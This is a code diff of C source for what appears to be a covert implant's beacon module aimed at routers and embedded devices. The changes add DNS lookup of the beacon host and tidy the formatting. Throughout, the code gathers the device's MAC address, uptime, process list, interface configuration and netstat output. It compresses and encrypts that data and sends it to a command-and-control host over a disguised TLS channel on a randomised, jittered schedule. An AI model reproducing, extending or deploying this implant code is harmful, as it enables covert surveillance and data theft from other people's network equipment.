@@ -18,7 +18,10 @@
 #include "netstat_an.h"
 #include "netstat_rn.h"
 #include "compression.h"
+#include "string_utils.h"
+#include "dns_protocol.h"
 
+#define Free(x)	if ( (x) != NULL ) free((x));
 //******************************************************************
 #if defined LINUX || defined SOLARIS
 #include <pthread.h>
@@ -29,12 +32,12 @@
 #endif
 
 //******************************************************************
-static int send_beacon_data(BEACONINFO* beaconinfo, unsigned long uptime, int next_beacon);
-static void encrypt_data(unsigned char* src, int src_size, unsigned char* dest, unsigned char* key);
-static int get_printable_mac(unsigned char* dest, unsigned char* src);
-static unsigned int generate_random_bytes(unsigned char * buf, unsigned int size);
-static void extract_key(unsigned char* buf, unsigned char* key);
-static void embedSize(unsigned int size, unsigned char* buf);
+static int send_beacon_data(BEACONINFO * beaconinfo, unsigned long uptime, int next_beacon);
+static void encrypt_data(unsigned char *src, int src_size, unsigned char *dest, unsigned char *key);
+static int get_printable_mac(unsigned char *dest, unsigned char *src);
+static unsigned int generate_random_bytes(unsigned char *buf, unsigned int size);
+static void extract_key(unsigned char *buf, unsigned char *key);
+static void embedSize(unsigned int size, unsigned char *buf);
 
 //******************************************************************
 //***************** Cross Platform functions ***********************
@@ -45,37 +48,30 @@ static void embedSize(unsigned int size, unsigned char* buf);
 
 int calc_jitter(int baseTime, float jitterPercent)
 {
-	//multiple the percentage by the basetime to get the
-	//jitter range.
+	//Multiply the percentage by the baseTime to get the jitter range.
 	int jitterRange = 0;
 
 	jitterRange = baseTime * jitterPercent;
-	//determine if the jitter will be positive or negative.
-	if(rand() > RAND_MAX/2)
-	{
-		//make it positive
-		return rand() % jitterRange;
-	}
-	else
-	{
-		//make it negative
-		return -(rand() % jitterRange);
+	// Determine if the jitter will be positive or negative.
+	if (rand() > RAND_MAX / 2) {
+		return rand() % jitterRange;	//make it positive
+	} else {
+		return -(rand() % jitterRange);	//make it negative
 	}
 }
 
-unsigned int generate_random_bytes(unsigned char * buf, unsigned int size)
+unsigned int generate_random_bytes(unsigned char *buf, unsigned int size)
 {
 	unsigned int i;
 
-	for (i=0;i<size;i++)
-	{
-		buf[i] = (unsigned char)(rand() % 255);
+	for (i = 0; i < size; i++) {
+		buf[i] = (unsigned char) (rand() % 255);
 	}
 
 	return 0;
 }
 
-void embedSize(unsigned int size, unsigned char* buf)
+void embedSize(unsigned int size, unsigned char *buf)
 {
 	unsigned int i;
 	char sizeStr[30];
@@ -83,213 +79,136 @@ void embedSize(unsigned int size, unsigned char* buf)
 
 	memset(sizeStr, 0, 30);
 	memset(data, 0, 30);
-	sprintf( sizeStr, "%u", size);
+	sprintf(sizeStr, "%u", size);
 
 	data[0] = strlen(sizeStr) ^ XOR_KEY;
 
-	for(i = 0; i < strlen(sizeStr) + 1; i++)
-	{
-		 data[i+1] = sizeStr[i] ^ XOR_KEY;
+	for (i = 0; i < strlen(sizeStr) + 1; i++) {
+		data[i + 1] = sizeStr[i] ^ XOR_KEY;
 	}
 
-	memcpy(buf,data,strlen(sizeStr)+1);
+	memcpy(buf, data, strlen(sizeStr) + 1);
 }
 
-int beacon_start( char *beaconIP, int beaconPort, unsigned long initialDelay, int interval,float jitter)
+int beacon_start(BEACONINFO *beaconInfo)
 {
-	BEACONINFO 	*beaconInfo = NULL;
 	int numTries = 0;
 
-//TODO: check malloc() return value
-	beaconInfo = (BEACONINFO *)malloc( sizeof( BEACONINFO ));
-	memset( beaconInfo, 0, sizeof( BEACONINFO ) );
-
-	//initalize IP string
-//TODO: check malloc() return value
-	beaconInfo->ip = (char*) malloc( strlen( beaconIP ) + 1 );
-
-	//setup beacon stuct
-	memcpy( beaconInfo->ip,beaconIP, strlen( beaconIP ) + 1 );
-	beaconInfo->port = beaconPort;
-	beaconInfo->initDelay = initialDelay;
-	beaconInfo->interval = interval;
-	beaconInfo->percentVariance = jitter;
-	while(numTries != 5)
-	{
-		if( GetMacAddr(beaconInfo->macAddr) != SUCCESS)
-		{
+	while (numTries != 5) {
+		if (GetMacAddr(beaconInfo->macAddr) != SUCCESS) {
 			numTries++;
-			if( numTries == 5)
-			{
+			if (numTries == 5) {
 				DLX(1, printf("ERROR: failed to pull MAC address\n"));
-					return FAILURE;
+				return FAILURE;
 			}
-		}
-		else
-		{
+		} else {
 			break;
 		}
 		// TODO: should this be Sleep( 60 * 100 ); ???
 		sleep(60);
 	}
-
-	// NOTE: on Solaris 7, anything the thread writes to stdout,
-	// or stderr will not be displayed on the main console output.
-	// This default behavior is analogous to daemonizing the thread 
-
-#if defined __EFENCE__ || defined __VALGRIND__
-	if ( beacon( (void *)beaconInfo ) != SUCCESS )
-	{
-		DLX(1, printf( " ERROR: failed to create beacon thread\n" ));
-		return FAILURE;
-	}
-	else
-	{
-		goto not_reached;
-	}
-#endif
-	if ( make_thread( beacon, (void *)beaconInfo ) != SUCCESS )
-	{
-		DLX(1, printf( " ERROR: failed to create beacon thread\n" ));
+	if (make_thread(beacon, (void *) beaconInfo) != SUCCESS) {
+		DLX(1, printf(" ERROR: failed to create beacon thread\n"));
 		return FAILURE;
 	}
 
-	return SUCCESS;
-
-	// NOT REACHED
-//not_reached:
-//	free( beaconInfo->ip );
-//	free( beaconInfo );
 	return SUCCESS;
 }
 
-//******************************************************************
-// TODO: UNIX pthreads calls function that returns a void pointer?  
-// is Windows flexible, if not, we can still be portable by defining a new 
-// return type and having that defined, specifically, at compile time
-
-void *beacon(void* param)
+void *beacon(void *param)
 {
 	unsigned long secondsUp = 0;
-	int ret = 0;
 	int beaconInterval = 0;
 	int jitter = 0;
-	BEACONINFO *beaconInfo = (BEACONINFO *)param;
+	int i;
+	struct in_addr	beaconIPaddr;
+	BEACONINFO *beaconInfo;
 
-#ifdef __VALGRIND__
-	int counter = 0;
-#endif
+	beaconInfo = (BEACONINFO *) param;
+	DLX(4, printf("Starting beacon thread with initial beacon delay of %ld seconds\n", beaconInfo->initDelay / 1000));
+	Sleep(beaconInfo->initDelay);	// Wait for initial delay
 
-	DLX(4, printf ( "Starting beacon thread with initial beacon delay of %d seconds\n", beaconInfo->initDelay/1000));
+	for (;;) {		// Beacon Loop
+		secondsUp = GetSystemUpTime(); // Get system uptime
+		DLX(4, printf("\tSystem uptime is %ld\n", secondsUp));
 
-	//Wait out initial delay
-	Sleep(beaconInfo->initDelay);
+		// Resolve beacon IP address
+		if (inet_pton(AF_INET, beaconInfo->host, &beaconIPaddr) <= 0) {		// Determine if beacon host is an name or dotted-quad address
+			for (i = 0; i < 2; i++) {
+				if (strlen(beaconInfo->dns[i]))
+					DLX(4, printf("\tPerforming DNS lookup for %s using DNS server at %s.\n", beaconInfo->host, beaconInfo->dns[i]));
+					if ( (beaconInfo->ip = dns_resolv(beaconInfo->host, beaconInfo->dns[i])) )
+						break;
+			}
+			if (beaconInfo->ip == NULL) {
+				DLX(4, printf("\tBeacon host could not be resolved.\n"));
+				goto sleep;		// Try again next beacon interval
+			}
+		} else
+			beaconInfo->ip = strdup(beaconInfo->host);		// IF beaconInfo-> host was an IP address, clone it (so it can be freed later)
 
-	secondsUp = GetSystemUpTime();
-	DLX(1, printf("System uptime is %ld seconds\n", secondsUp));
-
-	//Send initial beacon back
-
-	// TODO: SendBeaconData does not handle errors returned
-	if (beaconInfo->percentVariance > 0)
-        {
-		//get jitter
-		jitter = calc_jitter(beaconInfo->interval, beaconInfo->percentVariance);
-		//calculate new interval 
-		beaconInterval = beaconInfo->interval + jitter;
-	}
-	else
-	{
-		beaconInterval = beaconInfo->interval;
-	}
-	DLX(2, printf( "Sending [first] beacon data\n" ));
-	ret = send_beacon_data(beaconInfo,secondsUp,beaconInterval);
-
-#if defined __EFENCE__ || defined __VALGRIND__
-//	if ( COUNTER_LIMIT == 0 ) goto not_reached;
-#endif
-
-	//Loop that gets uptime
-	for(;;)
-	{
-		//Sleep for the length of the interval
-		DLX(4, printf ("\tStarting beacon interval of %d seconds.\n", beaconInfo->interval/1000));
-		Sleep(beaconInterval);
-	
-		if (beaconInfo->percentVariance > 0)
-        	{
-			//get jitter
-			jitter = calc_jitter(beaconInfo->interval, beaconInfo->percentVariance);
-			//calculate new interval 
+		if (beaconInfo->percentVariance > 0) {
+			DLX(4, printf("Variance = %f\n", beaconInfo->percentVariance));
+			jitter = calc_jitter(beaconInfo->interval, beaconInfo->percentVariance);	// Get jitter and calculate new interval
+			DLX(4, printf("Jitter = %d\n", jitter));
 			beaconInterval = beaconInfo->interval + jitter;
-		}
-		else
-		{
+			DLX(4, printf("Beacon Interval = %d\n", beaconInterval));
+		} else {
 			beaconInterval = beaconInfo->interval;
 		}
 
-		//get system uptime
-		secondsUp = GetSystemUpTime();
-		DLX(4, printf( "\tSystem uptime is %ld\n", secondsUp));
-
-		//Beacon back
 		// TODO: SendBeaconData does not handle errors returned
-		DLX(4, printf( "\tSending beacon data\n"));
-		ret = send_beacon_data(beaconInfo,secondsUp,beaconInterval);
-		if(ret == SUCCESS) {
-			update_file((char*)sdcfp);
+		DLX(4, printf("\tSending beacon\n"));
+		if (send_beacon_data(beaconInfo, secondsUp, beaconInterval) == SUCCESS) {
+			update_file((char *) sdcfp);
 		} else {
-			DLX(4, printf( "\tSend of beacon data failed\n"));
+			DLX(4, printf("\tSend of beacon failed\n"));
 		}
-#ifdef __VALGRIND__
-	if ( ++counter > 10 ) goto not_reached;
-#endif
+		Free(beaconInfo->ip);
+
+	sleep:
+		DLX(4, printf("\tSending next beacon in %d seconds.\n", beaconInterval / 1000));
+		Sleep(beaconInterval);	//Sleep for the length of the interval
 
 	}
 
-	// NOT REACHED
-#ifdef __VALGRIND__
-not_reached:
-	terminate_thread();
-#endif
-
-	return (void *)NULL;
+	return (void *) NULL;
 }
 
 #include <stdlib.h>
 //******************************************************************
-static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int next_beacon)
+static int send_beacon_data(BEACONINFO * beaconInfo, unsigned long uptime, int next_beacon)
 {
-	int					sock = 0;
-	int					retval = 0;
-	int					size = 0;
-	int					defaultBufSize = 3000;
-	unsigned int		packetSize = 0;
-	unsigned int		compressedPacketSize = 0;
-	int					encrypt_size = 0;
-	int					bytes_sent = 0;
-	int					sz_to_send = 0;
-	int					recv_sz = 0;
-	char				temp[1024];
-	char				recv_buf[30];
-	//unsigned char*		cmd_str = NULL;
-	unsigned char*		enc_buf = NULL;
-	unsigned char*		packet = NULL;
-	unsigned char*		compressed_packet = NULL;
-	unsigned char*		ptr = NULL;
-	unsigned char		randData[64];
-	unsigned char		key[16];
+	int sock = 0;
+	int retval = 0;
+	int size = 0;
+	int defaultBufSize = 3000;
+	unsigned int packetSize = 0;
+	unsigned int compressedPacketSize = 0;
+	int encrypt_size = 0;
+	int bytes_sent = 0;
+	int sz_to_send = 0;
+	int recv_sz = 0;
+	char temp[1024];
+	char recv_buf[30];
+	//unsigned char*        cmd_str = NULL;
+	unsigned char *enc_buf = NULL;
+	unsigned char *packet = NULL;
+	unsigned char *compressed_packet = NULL;
+	unsigned char *ptr = NULL;
+	unsigned char randData[64];
+	unsigned char key[16];
 
 	//beacon packet structs
-	BEACON_HDR			bhdr;
-	ADD_HDR				mac_hdr;
-	ADD_HDR				uptime_hdr;
-	ADD_HDR				proc_list_hdr;
-	ADD_HDR				ipconfig_hdr;
-	ADD_HDR				netstat_rn_hdr;
-	ADD_HDR				netstat_an_hdr;
-	ADD_HDR				next_beacon_hdr;
-	ADD_HDR				end_hdr;
+	BEACON_HDR bhdr;
+	ADD_HDR mac_hdr;
+	ADD_HDR uptime_hdr;
+	ADD_HDR proc_list_hdr;
+	ADD_HDR ipconfig_hdr;
+	ADD_HDR netstat_rn_hdr;
+	ADD_HDR netstat_an_hdr;
+	ADD_HDR next_beacon_hdr;
+	ADD_HDR end_hdr;
 
 	//beacon packet sizes. (used for memcpy)
 	unsigned short mac_len = 0;
@@ -301,117 +220,110 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 	unsigned short next_beacon_len = 0;
 
 	//beacon data strings
-	unsigned char* mac_data = NULL;
-	unsigned char* uptime_data = NULL;
-	unsigned char* proc_list_data = NULL;
-	unsigned char* ipconfig_data = NULL;
-	unsigned char* netstat_rn_data = NULL;
-	unsigned char* netstat_an_data = NULL;
-	unsigned char* next_beacon_data = NULL;
-	
-	crypt_context *beacon_io = NULL;		// Command and control I/O connection context
+	unsigned char *mac_data = NULL;
+	unsigned char *uptime_data = NULL;
+	unsigned char *proc_list_data = NULL;
+	unsigned char *ipconfig_data = NULL;
+	unsigned char *netstat_rn_data = NULL;
+	unsigned char *netstat_an_data = NULL;
+	unsigned char *next_beacon_data = NULL;
+
+	crypt_context *beacon_io = NULL;	// Command and control I/O connection context
 
 	memset(temp, 0, 1024);
 
 	//Populate Beacon Header
-	bhdr.os = 0;
+	bhdr.os = BH_UNDEFINED;
+
 #if defined AVTECH_ARM
-		bhdr.os = htons(BH_AVTECH_ARM);
+	bhdr.os = BH_AVTECH_ARM;
 
 #elif defined MIKROTIK
-	#if defined _PPC
-		bhdr.os = htons(BH_MIKROTIK_PPC);
-	#elif defined _MIPS
-		bhdr.os = htons(BH_MIKROTIK_MIPS);
-	#elif defined _MIPSEL
-		bhdr.os = htons(BH_MIKROTIK_MIPSEL);
-	#elif defined _X86
-		bhdr.os = htons(BH_MIKROTIK_X86);
-	#endif
-
-#elif (defined LINUX) && (!defined UBIQUITI)
-	#if defined _X86
-		bhdr.os = htons(BH_LINUX_X86);
-	#elif defined _X86_64
-		bhdr.os = htons(BH_LINUX_X86_64);
-	#endif
-
-#elif defined UBIQUITI
-		bhdr.os = htons(BH_UBIQUITI_MIPS);
-
-#else
-	#error "ARCHITECTURE NOT DEFINED"
+#if defined _PPC
+	bhdr.os = BH_MIKROTIK_PPC;
+#elif defined _MIPS
+	bhdr.os = BH_MIKROTIK_MIPS;
+#elif defined _MIPSEL
+	bhdr.os = BH_MIKROTIK_MIPSEL;
+#elif defined _X86
+	bhdr.os = BH_MIKROTIK_X86;
 #endif
 
-	//TODO: Change this number whenever the version changes.
-	bhdr.version = htons(29);
+#elif (defined LINUX) && (!defined UBIQUITI)
+#if defined _X86
+	bhdr.os = BH_LINUX_X86;
+#elif defined _X86_64
+	bhdr.os = BH_LINUX_X86_64;
+#endif
+
+#elif defined UBIQUITI
+	bhdr.os = BH_UBIQUITI_MIPS;
+
+#else
+#error "ARCHITECTURE NOT DEFINED"
+#endif
+
+	bhdr.version = BEACON_HEADER_VERSION;
 	DLX(4, printf("\tBEACON HEADER: version: %i, os: %i\n", bhdr.version, bhdr.os));
+	DLX(4, printf("\tBEACON DATA CHECK: IP: %s, Port: %d\n", beaconInfo->ip, beaconInfo->port));
+	bhdr.version = htons(BEACON_HEADER_VERSION);	//TODO: Change this number whenever the version changes.
+	bhdr.os = htons(bhdr.os);	// Convert for network byte order
 
 	//Populate Additional Headers
-	//mac address
+	// MAC address
 	mac_hdr.type = htons(MAC);
-	mac_data = (unsigned char*) malloc(MAC_ADDR_LEN_FORMATTED);
-	if(mac_data != NULL)
-	{
+	mac_data = (unsigned char *) malloc(MAC_ADDR_LEN_FORMATTED);
+	if (mac_data != NULL) {
 		memset(mac_data, 0, MAC_ADDR_LEN_FORMATTED);
 		get_printable_mac(mac_data, beaconInfo->macAddr);
 	}
-	mac_len = strlen((char *)mac_data);
+	mac_len = strlen((char *) mac_data);
 	mac_hdr.length = htons(mac_len);
-	//uptime
+
+	// Uptime
 	uptime_hdr.type = htons(UPTIME);
-	memset( temp, 0, 1024);
-	sprintf( temp, "%lu", uptime);
-	uptime_len = strlen(temp)+1;
+	memset(temp, 0, 1024);
+	sprintf(temp, "%lu", uptime);
+	uptime_len = strlen(temp) + 1;
 	uptime_hdr.length = htons(uptime_len);
 
-	uptime_data = (unsigned char*) malloc(uptime_len);
-	if(uptime_data != NULL)
-	{
-		memset(uptime_data,0,uptime_len);
-		memcpy(uptime_data,temp,uptime_len);
+	uptime_data = (unsigned char *) malloc(uptime_len);
+	if (uptime_data != NULL) {
+		memset(uptime_data, 0, uptime_len);
+		memcpy(uptime_data, temp, uptime_len);
 	}
-
-	//next beacon time in seconds
+	// Next-beacon time in seconds
 	next_beacon_hdr.type = htons(NEXT_BEACON_TIME);
 	memset(temp, 0, 1024);
-	sprintf(temp, "%d", (next_beacon/1000));
+	sprintf(temp, "%d", (next_beacon / 1000));
 
 	next_beacon_len = strlen(temp);
 	next_beacon_hdr.length = htons(next_beacon_len);
 
-	next_beacon_data = (unsigned char*) malloc(next_beacon_len);
-	if(next_beacon_data != NULL)
-	{
+	next_beacon_data = (unsigned char *) malloc(next_beacon_len);
+	if (next_beacon_data != NULL) {
 		memset(next_beacon_data, 0, next_beacon_len);
 		memcpy(next_beacon_data, temp, next_beacon_len);
 	}
-	
-	//process list
+	// Process list
 	proc_list_hdr.type = htons(PROCESS_LIST);
 //TODO: check malloc() return value
 	proc_list_data = get_process_list(&size);
-	if( proc_list_data == NULL)
-	{
+	if (proc_list_data == NULL) {
 		proc_list_len = 0;
-	}
-	else
-	{
+	} else {
 		proc_list_len = size;
 	}
 	proc_list_hdr.length = htons(proc_list_len);
 
 	size = defaultBufSize;
-	
+
 	//ipconfig 
 	ipconfig_hdr.type = htons(IPCONFIG);
 	ipconfig_data = get_ifconfig(&size);
-	if(ipconfig_data == NULL)
-	{
+	if (ipconfig_data == NULL) {
 		ipconfig_len = 0;
-	}
-	else
-	{
+	} else {
 		ipconfig_len = size;
 	}
 
@@ -423,12 +335,9 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 
 	netstat_rn_hdr.type = htons(NETSTAT_RN);
 	netstat_rn_data = get_netstat_rn(&size);
-	if(netstat_rn_data == NULL)
-	{
+	if (netstat_rn_data == NULL) {
 		netstat_rn_len = 0;
-	}
-	else
-	{
+	} else {
 		netstat_rn_len = size;
 	}
 	netstat_rn_hdr.length = htons(netstat_rn_len);
@@ -437,12 +346,9 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 	//netstat -an
 	netstat_an_hdr.type = htons(NETSTAT_AN);
 	netstat_an_data = get_netstat_an(&size);
-	if(netstat_an_data == NULL)
-	{
+	if (netstat_an_data == NULL) {
 		netstat_an_len = 0;
-	}
-	else
-	{
+	} else {
 		netstat_an_len = size;
 	}
 	netstat_an_hdr.length = htons(netstat_an_len);
@@ -455,148 +361,122 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 	//create packet
 	//size is equal to the size of a beacon header + the size of 6 additional headers (one of which
 	// is the ending header) + the size of all the data fields.
-	packetSize = (sizeof(ADD_HDR) * 8) + mac_len + uptime_len + 
+	packetSize = (sizeof(ADD_HDR) * 8) + mac_len + uptime_len +
 		proc_list_len + ipconfig_len + netstat_rn_len + netstat_an_len + next_beacon_len;
 
-	packet = (unsigned char*) malloc(packetSize);
-	if( packet == NULL)
-	{
+	packet = (unsigned char *) malloc(packetSize);
+	if (packet == NULL) {
 		DLX(1, printf("Not enough memory to allocate packet!"));
 		goto EXIT;
 	}
 	memset(packet, 0, packetSize);
 	ptr = packet;
-		
+
 	//copy in mac hdr
-	memcpy(ptr,(unsigned char*)&mac_hdr, sizeof(mac_hdr));
+	memcpy(ptr, (unsigned char *) &mac_hdr, sizeof(mac_hdr));
 	ptr += sizeof(ADD_HDR);
 	//copy in mac addr
-	memcpy(ptr,mac_data, mac_len);
+	memcpy(ptr, mac_data, mac_len);
 	ptr += mac_len;
 	//copy in uptime hdr
-	memcpy(ptr,(unsigned char*)&uptime_hdr, sizeof(uptime_hdr));
+	memcpy(ptr, (unsigned char *) &uptime_hdr, sizeof(uptime_hdr));
 	ptr += sizeof(ADD_HDR);
 	//copy in uptime data
-	memcpy(ptr,uptime_data, uptime_len);
+	memcpy(ptr, uptime_data, uptime_len);
 	ptr += uptime_len;
 	//copy in next beacon hdr
-	memcpy(ptr,(unsigned char*)&next_beacon_hdr,sizeof(next_beacon_hdr));
+	memcpy(ptr, (unsigned char *) &next_beacon_hdr, sizeof(next_beacon_hdr));
 	ptr += sizeof(ADD_HDR);
 	//copy in next beacon data
-	memcpy(ptr,next_beacon_data,next_beacon_len);
+	memcpy(ptr, next_beacon_data, next_beacon_len);
 	ptr += next_beacon_len;
 	//copy in process list hdr
-	if(proc_list_data != NULL)
-	{
-		memcpy(ptr,(unsigned char*)&proc_list_hdr, sizeof(proc_list_hdr));
+	if (proc_list_data != NULL) {
+		memcpy(ptr, (unsigned char *) &proc_list_hdr, sizeof(proc_list_hdr));
 		ptr += sizeof(ADD_HDR);
 		//copy in process list
-		memcpy(ptr,proc_list_data, proc_list_len);
+		memcpy(ptr, proc_list_data, proc_list_len);
 		ptr += proc_list_len;
 	}
 	//copy in ipconfig hdr
-	if(ipconfig_data != NULL)
-	{
-		memcpy(ptr,(unsigned char*)&ipconfig_hdr, sizeof(ipconfig_hdr));
+	if (ipconfig_data != NULL) {
+		memcpy(ptr, (unsigned char *) &ipconfig_hdr, sizeof(ipconfig_hdr));
 		ptr += sizeof(ADD_HDR);
 		//copy in ipconfig data
-		memcpy(ptr,ipconfig_data, ipconfig_len);
+		memcpy(ptr, ipconfig_data, ipconfig_len);
 		ptr += ipconfig_len;
 	}
 	//copy in netstat hdr
-	if(netstat_rn_data != NULL)
-	{
-		memcpy(ptr,(unsigned char*)&netstat_rn_hdr, sizeof(netstat_rn_hdr));
+	if (netstat_rn_data != NULL) {
+		memcpy(ptr, (unsigned char *) &netstat_rn_hdr, sizeof(netstat_rn_hdr));
 		ptr += sizeof(ADD_HDR);
 		//copy in netstat data
-		memcpy(ptr,netstat_rn_data,netstat_rn_len);
+		memcpy(ptr, netstat_rn_data, netstat_rn_len);
 		ptr += netstat_rn_len;
 	}
-
 	//copy in netstat hdr
-	if(netstat_an_data != NULL)
-	{
-		memcpy(ptr,(unsigned char*)&netstat_an_hdr, sizeof(netstat_an_hdr));
+	if (netstat_an_data != NULL) {
+		memcpy(ptr, (unsigned char *) &netstat_an_hdr, sizeof(netstat_an_hdr));
 		ptr += sizeof(ADD_HDR);
 		//copy in netstat data
-		memcpy(ptr,netstat_an_data,netstat_an_len);
+		memcpy(ptr, netstat_an_data, netstat_an_len);
 		ptr += netstat_an_len;
 	}
-
 	//add closing header
-	memcpy(ptr, (unsigned char*)&end_hdr, sizeof(end_hdr));
+	memcpy(ptr, (unsigned char *) &end_hdr, sizeof(end_hdr));
 
 	ptr = NULL;
 
 	//compress packet
-	compressed_packet = compress_packet(packet,packetSize,&compressedPacketSize);
+	compressed_packet = compress_packet(packet, packetSize, &compressedPacketSize);
 	DLX(5, printf("Original packet size: %d, Compressed packet size: %d\n", packetSize, compressedPacketSize));
 	//combine compressed_packet with beacon header.
-	if(packet != NULL)
-	{
-		free(packet);
-	}
+
+	Free(packet);
+
 
 	packetSize = sizeof(BEACON_HDR) + compressedPacketSize;
-	packet = (unsigned char*)malloc(packetSize);
-	if(packet == NULL)
-	{
+	packet = (unsigned char *) malloc(packetSize);
+	if (packet == NULL) {
 		goto EXIT;
 	}
 
-	//zero out buffer
-	memset(packet, 0, packetSize);
-	//copy in beacon hdr
-	memcpy(packet, &bhdr, sizeof(BEACON_HDR));
-	//copy in compressed data
-	memcpy(packet+sizeof(BEACON_HDR), compressed_packet, compressedPacketSize);
-
-	//calculate encryption buffer size
-	encrypt_size = packetSize + (8 - (packetSize % 8));
+	memset(packet, 0, packetSize);													// Zero out buffer
+	memcpy(packet, &bhdr, sizeof(BEACON_HDR));										// Copy-in beacon header
+	memcpy(packet + sizeof(BEACON_HDR), compressed_packet, compressedPacketSize);	// Copy-in compressed data
+	encrypt_size = packetSize + (8 - (packetSize % 8));								// Calculate encryption buffer size
 
 	//connect to the client
-	DLX(4, printf("Connecting to client %s on port %d using socket: %d\n", beaconInfo->ip, beaconInfo->port, sock));
-	retval = net_connect(&sock,beaconInfo->ip, beaconInfo->port);
-
-	if ( retval != SUCCESS )
-	{
-		DLX(1, printf("\tERROR: net_connect(): ");
-			if ( retval == POLARSSL_ERR_NET_CONNECT_FAILED )
-			{
-				printf( "NET_CONNECT_FAILED\n");
-			}
-			else if ( retval == POLARSSL_ERR_NET_SOCKET_FAILED )
-			{
-				printf( "NET_SOCKET_FAILED\n");
-			}
-			else if ( retval == POLARSSL_ERR_NET_UNKNOWN_HOST )
-			{
-				printf( "NET_UNKNOWN_HOST\n");
-			}
+	DLX(4, printf("\tAttempting connection to client %s on port %d...\n", beaconInfo->ip, beaconInfo->port));
+	retval = net_connect(&sock, beaconInfo->ip, beaconInfo->port);
+	if (retval != SUCCESS) {
+		DLX(1, printf("\tERROR: net_connect(): "); if (retval == POLARSSL_ERR_NET_CONNECT_FAILED) {
+			printf("NET_CONNECT_FAILED\n");}
 			else
-			{
-				printf( "Unknown error\n");
-			}
+			if (retval == POLARSSL_ERR_NET_SOCKET_FAILED) {
+			printf("NET_SOCKET_FAILED\n");}
+			else
+			if (retval == POLARSSL_ERR_NET_UNKNOWN_HOST) {
+			printf("NET_UNKNOWN_HOST\n");}
+			else {
+			printf("Unknown error\n");}
 		);
 
 		// we can return from here. no need to goto to bottom of function because
 		// at this stage, there is nothing to clean-up
-		//return FAILURE; 
-		//Don't think that is true you have allocated all of your beacon info
-		//however it just couldnt connect out lets clean up
+		// return FAILURE;
+		// Don't think that is true you have allocated all of your beacon info
+		// however it just couldn't connect out; lets clean up.
 		retval = FAILURE;
 		goto EXIT;
 	}
-
 	//setup ssl
-	DLX(4, printf("\tSetup crypto\n"));
-	if ((beacon_io = crypt_setup_client(&sock)) == NULL)
-	{
+	DLX(4, printf("\tConnection successful, setup crypto\n"));
+	if ((beacon_io = crypt_setup_client(&sock)) == NULL) {
 		DLX(4, printf("\tERROR: crypt_setup_client()\n"));
 		retval = FAILURE;
 		goto EXIT;
 	}
-
 	//set swindle flag to true
 	beacon_io->ssl->use_custom = 1;
 	beacon_io->ssl->tool_id = TOOL_ID;
@@ -604,229 +484,169 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 
 	//perform an SSL handshake
 	DLX(4, printf("\tPerform SSL handshake\n"));
-	if (crypt_handshake(beacon_io) != SUCCESS)
-	{
+	if (crypt_handshake(beacon_io) != SUCCESS) {
 		DLX(2, printf("\tERROR: SSL connection with SSL server failed to initialize.\n"));
-			retval = FAILURE;
+		retval = FAILURE;
 		goto EXIT;
 	}
 
 	DLX(4, printf("\tHandshake Complete!\n"));
 
-	//turn off the ssl encryption since we use our own
-	beacon_io->ssl->do_crypt = 0;
+	beacon_io->ssl->do_crypt = 0;			//turn off the ssl encryption since we use our own
+	generate_random_bytes(randData, 64);	//generate 32 random bytes
+	embedSize(encrypt_size, randData);		//embed the data size so the server knows how much data to read
 
-	//generate 32 random bytes
-	generate_random_bytes(randData,64);
-
-	//embed the data size so the server knows how much data to read
-	embedSize(encrypt_size,randData);
 	DLX(4, printf("\tEncrypt_size is %d \n", encrypt_size));
-
-	DLX(4, printf( "\tSending the first 64 bytes with data size encoded in random data\n"));
+	DLX(4, printf("\tSending the first 64 bytes with data size encoded in random data\n"));
 	//send the bytes 
-	if (crypt_write(beacon_io, randData, 64) < 0)
-	{  //TODO: this is probably no the best check... maybe 32 > cryptwrite
+	if (crypt_write(beacon_io, randData, 64) < 0) {	//TODO: this is probably no the best check... maybe 32 > crypt_write
 		retval = FAILURE;
 		goto EXIT;
 	}
-
 	//receive the buffer
 	memset(randData, 0, 64);
-
-	retval = recv(sock,(char*)randData,37,0);
-	if (retval < 0)
-	{
-		DLX(4, printf( "\tReceive failed:"));
+	retval = recv(sock, (char *) randData, 37, 0);
+	if (retval < 0) {
+		DLX(4, printf("\tReceive failed:"));
 		perror("1");
 		retval = FAILURE;
 		goto EXIT;
 	}
-	DLX(4, printf( "\tReceived %d bytes\n", retval));
+	DLX(4, printf("\tReceived %d bytes\n", retval));
 
-	//extract the key
-	extract_key(randData + 5,key);
+	extract_key(randData + 5, key);		//extract the key
 
 	//encrypt the beacon data with the extracted key
 	//the buffer is padded so that it can be broken
 	//up into 8 byte chunks
-	enc_buf = (unsigned char*) malloc(encrypt_size); 
-	if(enc_buf == NULL)
-	{
+	enc_buf = (unsigned char *) malloc(encrypt_size);
+	if (enc_buf == NULL) {
 		DLX(1, printf("Could not allocate space for enc_buf"));
 		goto EXIT;
 	}
-	memset(enc_buf, 0 , encrypt_size);
+	memset(enc_buf, 0, encrypt_size);
+	encrypt_data(packet, packetSize, enc_buf, key);
 
-	encrypt_data(packet,packetSize,enc_buf,key);
-	
-	//send the data
-	//while we haven't sent all data keep going
-	//send size embedded in rand data
-	//send encrypted data
+	//	Send the data until all data has been sent
+	//	Size embedded in random data
+	//	Send encrypted data
 	do {
 
-		//embed the data size so the server knows how much data to read
+		// Embed the data size so the server knows how much data to read
 		sz_to_send = (encrypt_size - bytes_sent) >= MAX_SSL_PACKET_SIZE ? MAX_SSL_PACKET_SIZE : encrypt_size - bytes_sent;
-		DLX(4, printf("\tSending: %d bytes\n", sz_to_send));
+		DLX(6, printf("\tSending: %d bytes\n", sz_to_send));
 
 		retval = crypt_write(beacon_io, enc_buf + bytes_sent, sz_to_send);
-		if( retval < 0) {
-			DLX(4, printf("crypt_write() failed: "); print_ssl_error(retval));
+		if (retval < 0) {
+			DLX(4, printf("crypt_write() failed: ");
+				print_ssl_error(retval));
 			retval = FAILURE;
 			goto EXIT;
 		}
 
 		// Receive ACK
 		memset(recv_buf, 0, 30);
-
 		retval = recv(sock, recv_buf, 30, 0);
-		if (retval < 0)
-		{
-			DLX(4, printf( "\tReceive failed:"));
+		if (retval < 0) {
+			DLX(4, printf("\tReceive failed:"));
 			perror("2");
 			retval = FAILURE;
 			goto EXIT;
 		}
